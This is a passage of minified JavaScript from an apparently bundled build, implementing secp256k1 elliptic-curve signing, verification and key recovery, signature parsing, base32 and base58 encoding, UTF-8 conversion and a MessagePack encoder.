m=n.add(m,m),S=n.mul(B,$),S=n.add(S,S),N=n.mul(b,S),E=n.mul(O,y),E=n.add(N,E),N=n.sub(P,E),E=n.add(P,E),E=n.mul(N,E),N=n.mul(m,N),S=n.mul(O,S),y=n.mul(b,y),m=n.sub(D,y),m=n.mul(b,m),m=n.add(m,S),S=n.add(D,D),D=n.add(S,D),D=n.add(D,y),D=n.mul(D,m),E=n.add(E,D),y=n.mul(k,$),y=n.add(y,y),D=n.mul(y,m),N=n.sub(N,D),S=n.mul(y,P),S=n.add(S,S),S=n.add(S,S),new g(N,E,S)}add(b){f(b);const{px:x,py:O,pz:B}=this,{px:k,py:$,pz:N}=b;let E=n.ZERO,S=n.ZERO,D=n.ZERO;const P=e.a,y=n.mul(e.b,Fo);let m=n.mul(x,k),I=n.mul(O,$),T=n.mul(B,N),A=n.add(x,O),R=n.add(k,$);A=n.mul(A,R),R=n.add(m,I),A=n.sub(A,R),R=n.add(x,B);let U=n.add(k,N);return R=n.mul(R,U),U=n.add(m,T),R=n.sub(R,U),U=n.add(O,B),E=n.add($,N),U=n.mul(U,E),E=n.add(I,T),U=n.sub(U,E),D=n.mul(P,R),E=n.mul(y,T),D=n.add(E,D),E=n.sub(I,D),D=n.add(I,D),S=n.mul(E,D),I=n.add(m,m),I=n.add(I,m),T=n.mul(P,T),R=n.mul(y,R),I=n.add(I,T),T=n.sub(m,T),T=n.mul(P,T),R=n.add(R,T),m=n.mul(I,R),S=n.add(S,m),m=n.mul(U,R),E=n.mul(A,E),E=n.sub(E,m),m=n.mul(A,I),D=n.mul(U,D),D=n.add(D,m),new g(E,S,D)}subtract(b){return this.add(b.negate())}is0(){return this.equals(g.ZERO)}wNAF(b){return C.wNAFCached(this,b,g.normalizeZ)}multiplyUnsafe(b){const{endo:x,n:O}=e;Cr("scalar",b,sn,O);const B=g.ZERO;if(b===sn)return B;if(this.is0()||b===Oe)return this;if(!x||C.hasPrecomputes(this))return C.wNAFCachedUnsafe(this,b,g.normalizeZ);let{k1neg:k,k1:$,k2neg:N,k2:E}=x.splitScalar(b),S=B,D=B,P=this;for(;$>sn||E>sn;)$&Oe&&(S=S.add(P)),E&Oe&&(D=D.add(P)),P=P.double(),$>>=Oe,E>>=Oe;return k&&(S=S.negate()),N&&(D=D.negate()),D=new g(n.mul(D.px,x.beta),D.py,D.pz),S.add(D)}multiply(b){const{endo:x,n:O}=e;Cr("scalar",b,Oe,O);let B,k;if(x){const{k1neg:$,k1:N,k2neg:E,k2:S}=x.splitScalar(b);let{p:D,f:P}=this.wNAF(N),{p:y,f:m}=this.wNAF(S);D=C.constTimeNegate($,D),y=C.constTimeNegate(E,y),y=new g(n.mul(y.px,x.beta),y.py,y.pz),B=D.add(y),k=P.add(m)}else{const{p:$,f:N}=this.wNAF(b);B=$,k=N}return g.normalizeZ([B,k])[0]}multiplyAndAddUnsafe(b,x,O){const B=g.BASE,k=(N,E)=>E===sn||E===Oe||!N.equals(B)?N.multiplyUnsafe(E):N.multiply(E),$=k(this,x).add(k(b,O));return $.is0()?void 0:$}toAffine(b){return p(this,b)}isTorsionFree(){const{h:b,isTorsionFree:x}=e;if(b===Oe)return!0;if(x)return x(g,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:b,clearCofactor:x}=e;return b===Oe?this:x?x(g,this):this.multiplyUnsafe(e.h)}toRawBytes(b=!0){return _i("isCompressed",b),this.assertValidity(),i(g,this,b)}toHex(b=!0){return _i("isCompressed",b),Ii(this.toRawBytes(b))}}g.BASE=new g(e.Gx,e.Gy,n.ONE),g.ZERO=new g(n.ZERO,n.ONE,n.ZERO);const{endo:w,nBitLength:_}=e,C=v2(g,w?Math.ceil(_/2):_);return{CURVE:e,ProjectivePoint:g,normPrivateKeyToScalar:h,weierstrassEquation:o,isWithinCurveOrder:u}}function D2(t){const e=ip(t);return Ys(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function A2(t){const e=D2(t),{Fp:n,n:r,nByteLength:i,nBitLength:s}=e,o=n.BYTES+1,a=2*n.BYTES+1;function c(y){return et(y,r)}function l(y){return Ca(y,r)}const{ProjectivePoint:u,normPrivateKeyToScalar:h,weierstrassEquation:f,isWithinCurveOrder:p}=S2({...e,toBytes(y,m,I){const T=m.toAffine(),A=n.toBytes(T.x),R=Ss;return _i("isCompressed",I),I?R(Uint8Array.from([m.hasEvenY()?2:3]),A):R(Uint8Array.from([4]),A,n.toBytes(T.y))},fromBytes(y){const m=y.length,I=y[0],T=y.subarray(1);if(m===o&&(I===2||I===3)){const A=tr(T);if(!Rc(A,Oe,n.ORDER))throw new Error("Point is not on curve");const R=f(A);let U;try{U=n.sqrt(R)}catch(L){const j=L instanceof Error?": "+L.message:"";throw new Error("Point is not on curve"+j)}const M=(U&Oe)===Oe;return(I&1)===1!==M&&(U=n.neg(U)),{x:A,y:U}}else if(m===a&&I===4){const A=n.fromBytes(T.subarray(0,n.BYTES)),R=n.fromBytes(T.subarray(n.BYTES,2*n.BYTES));return{x:A,y:R}}else{const A=o,R=a;throw new Error("invalid Point, expected length of "+A+", or uncompressed "+R+", got "+m)}}});function d(y){const m=r>>Oe;return y>m}function g(y){return d(y)?c(-y):y}const w=(y,m,I)=>tr(y.slice(m,I));class _{constructor(m,I,T){Cr("r",m,Oe,r),Cr("s",I,Oe,r),this.r=m,this.s=I,T!=null&&(this.recovery=T),Object.freeze(this)}static fromCompact(m){const I=i;return m=wt("compactSignature",m,I*2),new _(w(m,0,I),w(m,I,2*I))}static fromDER(m){const{r:I,s:T}=tn.toSig(wt("DER",m));return new _(I,T)}assertValidity(){}addRecoveryBit(m){return new _(this.r,this.s,m)}recoverPublicKey(m){const{r:I,s:T,recovery:A}=this,R=B(wt("msgHash",m));if(A==null||![0,1,2,3].includes(A))throw new Error("recovery id invalid");const U=A===2||A===3?I+e.n:I;if(U>=n.ORDER)throw new Error("recovery id 2 or 3 invalid");const M=(A&1)===0?"02":"03",q=u.fromHex(M+Lo(U,n.BYTES)),L=l(U),j=c(-R*L),K=c(T*L),G=u.BASE.multiplyAndAddUnsafe(q,j,K);if(!G)throw new Error("point at infinify");return G.assertValidity(),G}hasHighS(){return d(this.s)}normalizeS(){return this.hasHighS()?new _(this.r,c(-this.s),this.recovery):this}toDERRawBytes(){return Is(this.toDERHex())}toDERHex(){return tn.hexFromSig(this)}toCompactRawBytes(){return Is(this.toCompactHex())}toCompactHex(){const m=i;return Lo(this.r,m)+Lo(this.s,m)}}const C={isValidPrivateKey(y){try{return h(y),!0}catch{return!1}},normPrivateKeyToScalar:h,randomPrivateKey:()=>{const y=tp(e.n);return m2(e.randomBytes(y),e.n)},precompute(y=8,m=u.BASE){return m._setWindowSize(y),m.multiply(BigInt(3)),m}};function v(y,m=!0){return u.fromPrivateKey(y).toRawBytes(m)}function b(y){if(typeof y=="bigint")return!1;if(y instanceof u)return!0;const I=wt("key",y).length,T=n.BYTES,A=T+1,R=2*T+1;if(!(e.allowedPrivateKeyLengths||i===A))return I===A||I===R}function x(y,m,I=!0){if(b(y)===!0)throw new Error("first arg must be private key");if(b(m)===!1)throw new Error("second arg must be public key");return u.fromHex(m).multiply(h(y)).toRawBytes(I)}const O=e.bits2int||function(y){if(y.length>8192)throw new Error("input is too large");const m=tr(y),I=y.length*8-s;return I>0?m>>BigInt(I):m},B=e.bits2int_modN||function(y){return c(O(y))},k=Gs(s);function $(y){return Cr("num < 2^"+s,y,sn,k),Bi(y,i)}function N(y,m,I=E){if(["recovered","canonical"].some(H=>H in I))throw new Error("sign() legacy options not supported");const{hash:T,randomBytes:A}=e;let{lowS:R,prehash:U,extraEntropy:M}=I;R==null&&(R=!0),y=wt("msgHash",y),Bu(I),U&&(y=wt("prehashed msgHash",T(y)));const q=B(y),L=h(m),j=[$(L),$(q)];if(M!=null&&M!==!1){const H=M===!0?A(n.BYTES):M;j.push(wt("extraEntropy",H))}const K=Ss(...j),G=q;function Z(H){const Y=O(H);if(!p(Y))return;const te=l(Y),ue=u.BASE.multiply(Y).toAffine(),pe=c(ue.x);if(pe===sn)return;const ye=c(te*c(G+pe*L));if(ye===sn)return;let at=(ue.x===pe?0:2)|Number(ue.y&Oe),Nn=ye;return R&&d(ye)&&(Nn=g(ye),at^=1),new _(pe,Nn,at)}return{seed:K,k2sig:Z}}const E={lowS:e.lowS,prehash:!1},S={lowS:e.lowS,prehash:!1};function D(y,m,I=E){const{seed:T,k2sig:A}=N(y,m,I),R=e;return Sv(R.hash.outputLen,R.nByteLength,R.hmac)(T,A)}u.BASE._setWindowSize(8);function P(y,m,I,T=S){const A=y;m=wt("msgHash",m),I=wt("publicKey",I);const{lowS:R,prehash:U,format:M}=T;if(Bu(T),"strict"in T)throw new Error("options.strict was renamed to lowS");if(M!==void 0&&M!=="compact"&&M!=="der")throw new Error("format must be compact or der");const q=typeof A=="string"||Ti(A),L=!q&&!M&&typeof A=="object"&&A!==null&&typeof A.r=="bigint"&&typeof A.s=="bigint";if(!q&&!L)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let j,K;try{if(L&&(j=new _(A.r,A.s)),q){try{M!=="compact"&&(j=_.fromDER(A))}catch(at){if(!(at instanceof tn.Err))throw at}!j&&M!=="der"&&(j=_.fromCompact(A))}K=u.fromHex(I)}catch{return!1}if(!j||R&&j.hasHighS())return!1;U&&(m=e.hash(m));const{r:G,s:Z}=j,H=B(m),Y=l(Z),te=c(H*Y),ue=c(G*Y),pe=u.BASE.multiplyAndAddUnsafe(K,te,ue)?.toAffine();return pe?c(pe.x)===G:!1}return{CURVE:e,getPublicKey:v,getSharedSecret:x,sign:D,verify:P,ProjectivePoint:u,Signature:_,utils:C}}function O2(t){return{hash:t,hmac:(e,...n)=>Hd(t,e,J1(...n)),randomBytes:Q1}}function $2(t,e){const n=r=>A2({...t,...O2(r)});return{...n(e),create:n}}const sp=BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),Ru=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),C2=BigInt(0),P2=BigInt(1),Ta=BigInt(2),ku=(t,e)=>(t+e/Ta)/e;function T2(t){const e=sp,n=BigInt(3),r=BigInt(6),i=BigInt(11),s=BigInt(22),o=BigInt(23),a=BigInt(44),c=BigInt(88),l=t*t*t%e,u=l*l*t%e,h=pt(u,n,e)*u%e,f=pt(h,n,e)*u%e,p=pt(f,Ta,e)*l%e,d=pt(p,i,e)*p%e,g=pt(d,s,e)*d%e,w=pt(g,a,e)*g%e,_=pt(w,c,e)*w%e,C=pt(_,a,e)*g%e,v=pt(C,n,e)*u%e,b=pt(v,o,e)*d%e,x=pt(b,r,e)*l%e,O=pt(x,Ta,e);if(!Ba.eql(Ba.sqr(O),t))throw new Error("Cannot find square root");return O}const Ba=Uc(sp,void 0,void 0,{sqrt:T2}),B2=$2({a:C2,b:BigInt(7),Fp:Ba,n:Ru,Gx:BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),Gy:BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),h:BigInt(1),lowS:!0,endo:{beta:BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),splitScalar:t=>{const e=Ru,n=BigInt("0x3086d221a7d46bcde86c90e49284eb15"),r=-P2*BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),i=BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),s=n,o=BigInt("0x100000000000000000000000000000000"),a=ku(s*t,e),c=ku(-r*t,e);let l=et(t-a*n-c*i,e),u=et(-a*r-c*s,e);const h=l>o,f=u>o;if(h&&(l=e-l),f&&(u=e-u),l>o||u>o)throw new Error("splitScalar: Endomorphism failed, k="+t);return{k1neg:h,k1:l,k2neg:f,k2:u}}}},xv);function R2(t){if(t.length!==130&&t.length!==132)throw new N2({signature:t});const e=BigInt(en(t,0,32)),n=BigInt(en(t,32,64)),r=(()=>{const i=+`0x${t.slice(130)}`;if(!Number.isNaN(i))try{return k2(i)}catch{throw new U2({value:i})}})();return typeof r>"u"?{r:e,s:n}:{r:e,s:n,yParity:r}}function k2(t){if(t===0||t===27)return 0;if(t===1||t===28)return 1;if(t>=35)return t%2===0?1:0;throw new M2({value:t})}class N2 extends fe{constructor({signature:e}){super(`Value \`${e}\` is an invalid signature size.`,{metaMessages:["Expected: 64 bytes or 65 bytes.",`Received ${Pn(Nc(e))} bytes.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Signature.InvalidSerializedSizeError"})}}class U2 extends fe{constructor({value:e}){super(`Value \`${e}\` is an invalid y-parity value. Y-parity must be 0 or 1.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Signature.InvalidYParityError"})}}class M2 extends fe{constructor({value:e}){super(`Value \`${e}\` is an invalid v value. v must be 27, 28 or >=35.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Signature.InvalidVError"})}}function L2(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function op(t,e){return Array.isArray(e)?e.length===0?!0:t?e.every(n=>typeof n=="string"):e.every(n=>Number.isSafeInteger(n)):!1}function As(t,e){if(typeof e!="string")throw new Error(`${t}: string expected`);return!0}function Mc(t){if(!Number.isSafeInteger(t))throw new Error(`invalid integer: ${t}`)}function Ra(t){if(!Array.isArray(t))throw new Error("array expected")}function Os(t,e){if(!op(!0,e))throw new Error(`${t}: array of strings expected`)}function F2(t,e){if(!op(!1,e))throw new Error(`${t}: array of numbers expected`)}function j2(...t){const e=s=>s,n=(s,o)=>a=>s(o(a)),r=t.map(s=>s.encode).reduceRight(n,e),i=t.map(s=>s.decode).reduce(n,e);return{encode:r,decode:i}}function q2(t){const e=typeof t=="string"?t.split(""):t,n=e.length;Os("alphabet",e);const r=new Map(e.map((i,s)=>[i,s]));return{encode:i=>(Ra(i),i.map(s=>{if(!Number.isSafeInteger(s)||s<0||s>=n)throw new Error(`alphabet.encode: digit index outside alphabet "${s}". Allowed: ${t}`);return e[s]})),decode:i=>(Ra(i),i.map(s=>{As("alphabet.decode",s);const o=r.get(s);if(o===void 0)throw new Error(`Unknown letter: "${s}". Allowed: ${t}`);return o}))}}function z2(t=""){return As("join",t),{encode:e=>(Os("join.decode",e),e.join(t)),decode:e=>(As("join.decode",e),e.split(t))}}function V2(t,e="="){return Mc(t),As("padding",e),{encode(n){for(Os("padding.encode",n);n.length*t%8;)n.push(e);return n},decode(n){Os("padding.decode",n);let r=n.length;if(r*t%8)throw new Error("padding: invalid, string should have whole number of bytes");for(;r>0&&n[r-1]===e;r--)if((r-1)*t%8===0)throw new Error("padding: invalid, string has too much padding");return n.slice(0,r)}}}const ap=(t,e)=>e===0?t:ap(e,t%e),$s=(t,e)=>t+(e-ap(t,e)),jo=(()=>{let t=[];for(let e=0;e<40;e++)t.push(2**e);return t})();function Nu(t,e,n,r){if(Ra(t),e<=0||e>32)throw new Error(`convertRadix2: wrong from=${e}`);if(n<=0||n>32)throw new Error(`convertRadix2: wrong to=${n}`);if($s(e,n)>32)throw new Error(`convertRadix2: carry overflow from=${e} to=${n} carryBits=${$s(e,n)}`);let i=0,s=0;const o=jo[e],a=jo[n]-1,c=[];for(const l of t){if(Mc(l),l>=o)throw new Error(`convertRadix2: invalid data word=${l} from=${e}`);if(i=i<<e|l,s+e>32)throw new Error(`convertRadix2: carry overflow pos=${s} from=${e}`);for(s+=e;s>=n;s-=n)c.push((i>>s-n&a)>>>0);const u=jo[s];if(u===void 0)throw new Error("invalid carry");i&=u-1}if(i=i<<n-s&a,!r&&s>=e)throw new Error("Excess padding");if(!r&&i>0)throw new Error(`Non-zero padding: ${i}`);return r&&s>0&&c.push(i>>>0),c}function W2(t,e=!1){if(Mc(t),t<=0||t>32)throw new Error("radix2: bits should be in (0..32]");if($s(8,t)>32||$s(t,8)>32)throw new Error("radix2: carry overflow");return{encode:n=>{if(!L2(n))throw new Error("radix2.encode input should be Uint8Array");return Nu(Array.from(n),8,t,!e)},decode:n=>(F2("radix2.decode",n),Uint8Array.from(Nu(n,t,8,e)))}}const K2=j2(W2(5),q2("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"),V2(5),z2(""));function H2(t){return a2(G2(t))}function G2(t){const{payload:e,signature:n}=t,{r,s:i,yParity:s}=n,a=new B2.Signature(BigInt(r),BigInt(i)).addRecoveryBit(s).recoverPublicKey(Nc(e).substring(2));return Jv(a)}function Y2(t){if(t.length>=255)throw new TypeError("Alphabet too long");const e=new Uint8Array(256);for(let l=0;l<e.length;l++)e[l]=255;for(let l=0;l<t.length;l++){const u=t.charAt(l),h=u.charCodeAt(0);if(e[h]!==255)throw new TypeError(u+" is ambiguous");e[h]=l}const n=t.length,r=t.charAt(0),i=Math.log(n)/Math.log(256),s=Math.log(256)/Math.log(n);function o(l){if(l instanceof Uint8Array||(ArrayBuffer.isView(l)?l=new Uint8Array(l.buffer,l.byteOffset,l.byteLength):Array.isArray(l)&&(l=Uint8Array.from(l))),!(l instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(l.length===0)return"";let u=0,h=0,f=0;const p=l.length;for(;f!==p&&l[f]===0;)f++,u++;const d=(p-f)*s+1>>>0,g=new Uint8Array(d);for(;f!==p;){let C=l[f],v=0;for(let b=d-1;(C!==0||v<h)&&b!==-1;b--,v++)C+=256*g[b]>>>0,g[b]=C%n>>>0,C=C/n>>>0;if(C!==0)throw new Error("Non-zero carry");h=v,f++}let w=d-h;for(;w!==d&&g[w]===0;)w++;let _=r.repeat(u);for(;w<d;++w)_+=t.charAt(g[w]);return _}function a(l){if(typeof l!="string")throw new TypeError("Expected String");if(l.length===0)return new Uint8Array;let u=0,h=0,f=0;for(;l[u]===r;)h++,u++;const p=(l.length-u)*i+1>>>0,d=new Uint8Array(p);for(;u<l.length;){const C=l.charCodeAt(u);if(C>255)return;let v=e[C];if(v===255)return;let b=0;for(let x=p-1;(v!==0||b<f)&&x!==-1;x--,b++)v+=n*d[x]>>>0,d[x]=v%256>>>0,v=v/256>>>0;if(v!==0)throw new Error("Non-zero carry");f=b,u++}let g=p-f;for(;g!==p&&d[g]===0;)g++;const w=new Uint8Array(h+(p-g));let _=h;for(;g!==p;)w[_++]=d[g++];return w}function c(l){const u=a(l);if(u)return u;throw new Error("Non-base"+n+" character")}return{encode:o,decodeUnsafe:a,decode:c}}var Z2="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";const Ri=Y2(Z2);function X2(t){const e=t.length;let n=0,r=0;for(;r<e;){let i=t.charCodeAt(r++);if((i&4294967168)===0){n++;continue}else if((i&4294965248)===0)n+=2;else{if(i>=55296&&i<=56319&&r<e){const s=t.charCodeAt(r);(s&64512)===56320&&(++r,i=((i&1023)<<10)+(s&1023)+65536)}(i&4294901760)===0?n+=3:n+=4}}return n}function J2(t,e,n){const r=t.length;let i=n,s=0;for(;s<r;){let o=t.charCodeAt(s++);if((o&4294967168)===0){e[i++]=o;continue}else if((o&4294965248)===0)e[i++]=o>>6&31|192;else{if(o>=55296&&o<=56319&&s<r){const a=t.charCodeAt(s);(a&64512)===56320&&(++s,o=((o&1023)<<10)+(a&1023)+65536)}(o&4294901760)===0?(e[i++]=o>>12&15|224,e[i++]=o>>6&63|128):(e[i++]=o>>18&7|240,e[i++]=o>>12&63|128,e[i++]=o>>6&63|128)}e[i++]=o&63|128}}const Q2=new TextEncoder,eE=50;function tE(t,e,n){Q2.encodeInto(t,e.subarray(n))}function nE(t,e,n){t.length>eE?tE(t,e,n):J2(t,e,n)}const rE=4096;function cp(t,e,n){let r=e;const i=r+n,s=[];let o="";for(;r<i;){const a=t[r++];if((a&128)===0)s.push(a);else if((a&224)===192){const c=t[r++]&63;s.push((a&31)<<6|c)}else if((a&240)===224){const c=t[r++]&63,l=t[r++]&63;s.push((a&31)<<12|c<<6|l)}else if((a&248)===240){const c=t[r++]&63,l=t[r++]&63,u=t[r++]&63;let h=(a&7)<<18|c<<12|l<<6|u;h>65535&&(h-=65536,s.push(h>>>10&1023|55296),h=56320|h&1023),s.push(h)}else s.push(a);s.length>=rE&&(o+=String.fromCharCode(...s),s.length=0)}return s.length>0&&(o+=String.fromCharCode(...s)),o}const iE=new TextDecoder,sE=200;function oE(t,e,n){const r=t.subarray(e,e+n);return iE.decode(r)}function aE(t,e,n){return n>sE?oE(t,e,n):cp(t,e,n)}class Qi{constructor(e,n){this.type=e,this.data=n}}class ut extends Error{constructor(e){super(e);const n=Object.create(ut.prototype);Object.setPrototypeOf(this,n),Object.defineProperty(this,"name",{configurable:!0,enumerable:!1,value:ut.name})}}const Xr=4294967295;function cE(t,e,n){const r=n/4294967296,i=n;t.setUint32(e,r),t.setUint32(e+4,i)}function lp(t,e,n){const r=Math.floor(n/4294967296),i=n;t.setUint32(e,r),t.setUint32(e+4,i)}function up(t,e){const n=t.getInt32(e),r=t.getUint32(e+4);return n*4294967296+r}function lE(t,e){const n=t.getUint32(e),r=t.getUint32(e+4);return n*4294967296+r}const uE=-1,hE=4294967296-1,fE=17179869184-1;function dE({sec:t,nsec:e}){if(t>=0&&e>=0&&t<=fE)if(e===0&&t<=hE){const n=new Uint8Array(4);return new DataView(n.buffer).setUint32(0,t),n}else{const n=t/4294967296,r=t&4294967295,i=new Uint8Array(8),s=new DataView(i.buffer);return s.setUint32(0,e<<2|n&3),s.setUint32(4,r),i}else{const n=new Uint8Array(12),r=new DataView(n.buffer);return r.setUint32(0,e),lp(r,4,t),n}}function pE(t){const e=t.getTime(),n=Math.floor(e/1e3),r=(e-n*1e3)*1e6,i=Math.floor(r/1e9);return{sec:n+i,nsec:r-i*1e9}}function gE(t){if(t instanceof Date){const e=pE(t);return dE(e)}else return null}function yE(t){const e=new DataView(t.buffer,t.byteOffset,t.byteLength);switch(t.byteLength){case 4:return{sec:e.getUint32(0),nsec:0};case 8:{const n=e.getUint32(0),r=e.getUint32(4),i=(n&3)*4294967296+r,s=n>>>2;return{sec:i,nsec:s}}case 12:{const n=up(e,4),r=e.getUint32(0);return{sec:n,nsec:r}}default:throw new ut(`Unrecognized data size for timestamp (expected 4, 8, or 12): ${t.length}`)}}function mE(t){const e=yE(t);return new Date(e.sec*1e3+e.nsec/1e6)}const wE={type:uE,encode:gE,decode:mE};class Cs{constructor(){this.builtInEncoders=[],this.builtInDecoders=[],this.encoders=[],this.decoders=[],this.register(wE)}register({type:e,encode:n,decode:r}){if(e>=0)this.encoders[e]=n,this.decoders[e]=r;else{const i=-1-e;this.builtInEncoders[i]=n,this.builtInDecoders[i]=r}}tryToEncode(e,n){for(let r=0;r<this.builtInEncoders.length;r++){const i=this.builtInEncoders[r];if(i!=null){const s=i(e,n);if(s!=null){const o=-1-r;return new Qi(o,s)}}}for(let r=0;r<this.encoders.length;r++){const i=this.encoders[r];if(i!=null){const s=i(e,n);if(s!=null){const o=r;return new Qi(o,s)}}}return e instanceof Qi?e:null}decode(e,n,r){const i=n<0?this.builtInDecoders[-1-n]:this.decoders[n];return i?i(e,n,r):new Qi(n,e)}}Cs.defaultCodec=new Cs;function bE(t){return t instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&t instanceof SharedArrayBuffer}function ka(t){return t instanceof Uint8Array?t:ArrayBuffer.isView(t)?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):bE(t)?new Uint8Array(t):Uint8Array.from(t)}const vE=100,EE=2048;let xE=class hp{constructor(e){this.entered=!1,this.extensionCodec=e?.extensionCodec??Cs.defaultCodec,this.context=e?.context,this.useBigInt64=e?.useBigInt64??!1,this.maxDepth=e?.maxDepth??vE,this.initialBufferSize=e?.initialBufferSize??EE,this.sortKeys=e?.sortKeys??!1,this.forceFloat32=e?.forceFloat32??!1,this.ignoreUndefined=e?.ignoreUndefined??!1,this.forceIntegerToFloat=e?.forceIntegerToFloat??!1,this.pos=0,this.view=new DataView(new ArrayBuffer(this.initialBufferSize)),this.bytes=new Uint8Array(this.view.buffer)}clone(){return new hp({extensionCodec:this.extensionCodec,context:this.context,useBigInt64:this.useBigInt64,maxDepth:this.maxDepth,initialBufferSize:this.initialBufferSize,sortKeys:this.sortKeys,forceFloat32:this.forceFloat32,ignoreUndefined:this.ignoreUndefined,forceIntegerToFloat:this.forceIntegerToFloat})}reinitializeState(){this.pos=0}encodeSharedRef(e){if(this.entered)return this.clone().encodeSharedRef(e);try{return this.entered=!0,this.reinitializeState(),this.doEncode(e,1),this.bytes.subarray(0,this.pos)}finally{this.entered=!1}}encode(e){if(this.entered)return this.clone().encode(e);try{return this.entered=!0,this.reinitializeState(),this.doEncode(e,1),this.bytes.slice(0,this.pos)}finally{this.entered=!1}}doEncode(e,n){if(n>this.maxDepth)throw new Error(`Too deep objects in depth ${n}`);e==null?this.encodeNil():typeof e=="boolean"?this.encodeBoolean(e):typeof e=="number"?this.forceIntegerToFloat?this.encodeNumberAsFloat(e):this.encodeNumber(e):typeof e=="string"?this.encodeString(e):this.useBigInt64&&typeof e=="bigint"?this.encodeBigInt64(e):this.encodeObject(e,n)}ensureBufferSizeToWrite(e){const n=this.pos+e;this.view.byteLength<n&&this.resizeBuffer(n*2)}resizeBuffer(e){const n=new ArrayBuffer(e),r=new Uint8Array(n),i=new DataView(n);r.set(this.bytes),this.view=i,this.bytes=r}encodeNil(){this.writeU8(192)}encodeBoolean(e){e===!1?this.writeU8(194):this.writeU8(195)}encodeNumber(e){!this.forceIntegerToFloat&&Number.isSafeInteger(e)?e>=0?e<128?this.writeU8(e):e<256?(this.writeU8(204),this.writeU8(e)):e<65536?(this.writeU8(205),this.writeU16(e)):e<4294967296?(this.writeU8(206),this.writeU32(e)):this.useBigInt64?this.encodeNumberAsFloat(e):(this.writeU8(207),this.writeU64(e)):e>=-32?this.writeU8(224|e+32):e>=-128?(this.writeU8(208),this.writeI8(e)):e>=-32768?(this.writeU8(209),this.writeI16(e)):e>=-2147483648?(this.writeU8(210),this.writeI32(e)):this.useBigInt64?this.encodeNumberAsFloat(e):(this.writeU8(211),this.writeI64(e)):this.encodeNumberAsFloat(e)}encodeNumberAsFloat(e){this.forceFloat32?(this.writeU8(202),this.writeF32(e)):(this.writeU8(203),this.writeF64(e))}encodeBigInt64(e){e>=BigInt(0)?(this.writeU8(207),this.writeBigUint64(e)):(this.writeU8(211),this.writeBigInt64(e))}writeStringHeader(e){if(e<32)this.writeU8(160+e);else if(e<256)this.writeU8(217),this.writeU8(e);else if(e<65536)this.writeU8(218),this.writeU16(e);else if(e<4294967296)this.writeU8(219),this.writeU32(e);else throw new Error(`Too long string: ${e} bytes in UTF-8`)}encodeString(e){const r=X2(e);this.ensureBufferSizeToWrite(5+r),this.writeStringHeader(r),nE(e,this.bytes,this.pos),this.pos+=r}encodeObject(e,n){const r=this.extensionCodec.tryToEncode(e,this.context);if(r!=null)this.encodeExtension(r);else if(Array.isArray(e))this.encodeArray(e,n);else if(ArrayBuffer.isView(e))this.encodeBinary(e);else if(typeof e=="object")this.encodeMap(e,n);else throw new Error(`Unrecognized object: ${Object.prototype.toString.apply(e)}`)}encodeBinary(e){const n=e.byteLength;if(n<256)this.writeU8(196),this.writeU8(n);else if(n<65536)this.writeU8(197),this.writeU16(n);else if(n<4294967296)this.writeU8(198),this.writeU32(n);else throw new Error(`Too large binary: ${n}`);const r=ka(e);this.writeU8a(r)}encodeArray(e,n){const r=e.length;if(r<16)this.writeU8(144+r);else if(r<65536)this.writeU8(220),this.writeU16(r);else if(r<4294967296)this.writeU8(221),this.writeU32(r);else throw new Error(`Too large array: ${r}`);for(const i of e)this.doEncode(i,n+1)}countWithoutUndefined(e,n){let r=0;for(const i of n)e[i]!==void 0&&r++;return r}encodeMap(e,n){const r=Object.keys(e);this.sortKeys&&r.sort();const i=this.ignoreUndefined?this.countWithoutUndefined(e,r):r.length;if(i<16)this.writeU8(128+i);else if(i<65536)this.writeU8(222),this.writeU16(i);else if(i<4294967296)this.writeU8(223),this.writeU32(i);else throw new Error(`Too large map object: ${i}`);for(const s of r){const o=e[s];this.ignoreUndefined&&o===void 0||(this.encodeString(s),this.doEncode(o,n+1))}}encodeExtension(e){if(typeof e.data=="function"){const r=e.data(this.pos+6),i=r.length;if(i>=4294967296)throw new Error(`Too large extension object: ${i}`);this.writeU8(201),this.writeU32(i),this.writeI8(e.type),this.writeU8a(r);return}const n=e.data.length;if(n===1)this.writeU8(212);else if(n===2)this.writeU8(213);else if(n===4)this.writeU8(214);else if(n===8)this.writeU8(215);else if(n===16)this.writeU8(216);else if(n<256)this.writeU8(199),this.writeU8(n);else if(n<65536)this.writeU8(200),this.writeU16(n);else if(n<4294967296)this.writeU8(201),this.writeU32(n);else throw new Error(`Too large extension object: ${n}`);this.writeI8(e.type),this.writeU8a(e.data)}writeU8(e){this.ensureBufferSizeToWrite(1),this.view.setUint8(this.pos,e),this.pos++}writeU8a(e){const 